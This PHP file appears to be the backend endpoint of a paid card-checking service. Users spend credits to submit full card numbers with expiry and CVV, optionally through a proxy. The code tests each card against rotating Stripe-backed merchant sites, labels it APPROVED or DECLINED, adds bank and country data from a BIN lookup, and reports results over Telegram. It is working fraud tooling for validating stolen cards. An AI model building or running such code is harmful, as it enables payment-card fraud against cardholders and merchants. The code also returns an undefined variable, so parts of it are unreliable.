<?php
require_once 'config.php';
require_once 'auth.php';
require_once 'database.php';
require_once 'stripe_auth_checker.php';
require_once 'bin_lookup.php';

header('Content-Type: application/json');

// Initialize session and check auth
initSecureSession();
if (!isset($_SESSION['telegram_user_id'])) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit;
}

$userId = $_SESSION['telegram_user_id'];
$db = Database::getInstance();

// Get user data
$user = $db->getUserByTelegramId($userId);

if (!$user) {
    http_response_code(403);
    echo json_encode(['success' => false, 'message' => 'User not found']);
    exit;
}

// Check if user has credits
$creditCost = (int)SiteConfig::get('card_check_cost', AppConfig::CARD_CHECK_COST);

if ($user['credits'] < $creditCost) {
    echo json_encode([
        'success' => false,
        'message' => 'Insufficient credits',
        'credits_required' => $creditCost,
        'credits_available' => $user['credits']
    ]);
    exit;
}

// Get card and proxy from POST
$card = $_POST['card'] ?? '';
$proxy = $_POST['proxy'] ?? '';

if (empty($card)) {
    echo json_encode(['success' => false, 'message' => 'Card required']);
    exit;
}

// Validate card format (cc|mm|yyyy|cvv)
if (!preg_match('/^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$/', $card)) {
    echo json_encode(['success' => false, 'message' => 'Invalid card format. Use: cc|mm|yyyy|cvv']);
    exit;
}

try {
    // Get a random site from rotation
    $site = $db->getNextStripeAuthSite($userId);
    
    if (!$site) {
        echo json_encode(['success' => false, 'message' => 'No active Stripe Auth sites available']);
        exit;
    }

    // Use PHP implementation instead of Python
    $startTime = microtime(true);
    
    // Call PHP checker
    $result = checkStripeAuth($site, $card, $proxy);
    
    $endTime = microtime(true);
    $responseTime = round($endTime - $startTime, 2);

    // Get card info using BIN lookup (PHP version)
    $cardInfo = null;
    try {
        $cardInfo = BinLookup::getCardInfoFromCC($card);
    } catch (Exception $e) {
        // Ignore BIN lookup errors
    }

    // Determine if card is live (success = true from Python script)
    $isLive = $result['success'] === true;
    $status = $isLive ? 'APPROVED' : 'DECLINED';
    $message = $result['message'] ?? 'No response message';

    // Deduct credits
    $db->deductCredits($userId, $creditCost, 'Stripe Auth Check');

    // Log the check
    $db->logCCCheck([
        'user_id' => $userId,
        'card' => substr($card, 0, 6) . '****' . substr($card, -4), // Masked for security
        'gateway' => 'Stripe Auth',
        'site' => $site,
        'status' => $status,
        'message' => $message,
        'response_time' => $responseTime,
        'credits_used' => $creditCost,
        'timestamp' => new MongoDB\BSON\UTCDateTime()
    ]);

    // Send Telegram notification
    try {
        $telegramMessage = "🔔 *Stripe Auth Check*\n\n";
        $telegramMessage .= "👤 User: {$user['first_name']} ({$user['username']})\n";
        $telegramMessage .= "💳 Card: `" . substr($card, 0, 6) . "****" . substr($card, -4) . "`\n";
        $telegramMessage .= "🌐 Site: {$site}\n";
        $telegramMessage .= "📊 Status: " . ($isLive ? "✅ APPROVED" : "❌ DECLINED") . "\n";
        $telegramMessage .= "💬 Response: {$message}\n";
        
        if ($cardInfo) {
            $telegramMessage .= "\n🏦 *Card Info:*\n";
            $telegramMessage .= "Bank: " . ($cardInfo['bank'] ?? 'Unknown') . "\n";
            $telegramMessage .= "Type: " . ($cardInfo['type'] ?? 'Unknown') . "\n";
            $telegramMessage .= "Country: " . ($cardInfo['country'] ?? 'Unknown') . "\n";
        }
        
        $telegramMessage .= "\n⏱️ Response Time: {$responseTime}s";
        
        $db->sendTelegramNotification($telegramMessage);
    } catch (Exception $e) {
        // Ignore notification errors
    }

    // Return response
    echo json_encode([
        'success' => $isLive,
        'status' => $status,
        'message' => $message,
        'site' => $site,
        'card' => $card,
        'cardInfo' => $cardInfo,
        'response_time' => $responseTime,
        'credits_used' => $creditCost,
        'credits_remaining' => $user['credits'] - $creditCost,
        'account_email' => $result['account_email'] ?? null,
        'pm_id' => $result['pm_id'] ?? null,
        'raw_output' => $outputStr
    ]);

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'Server error: ' . $e->getMessage()
    ]);
}
?>
